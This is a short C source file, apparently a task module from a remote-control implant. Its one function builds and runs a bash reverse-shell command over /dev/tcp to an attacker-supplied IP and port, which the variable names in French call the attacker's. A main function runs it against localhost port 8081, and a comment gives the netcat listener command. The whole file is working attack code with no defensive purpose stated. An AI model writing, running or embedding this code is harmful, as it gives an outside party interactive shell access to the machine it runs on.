#include <stdio.h>
#include <stdlib.h>

int task_revshell(char *cmd[]) {
    char command[1024];
    char *ip_attaquant = cmd[3];
    char *port_attaquant = cmd[4];
    snprintf(command, sizeof(command), "bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", ip_attaquant, port_attaquant);
    system(command);
    return 0;
}

int main() {
    char *cmd[] = { "task", "revshell", "66bce8e71f", "127.0.0.1", "8081", NULL };
    task_revshell(cmd);
    return 0;
}

//ex d'utilisation nc -lv 8081






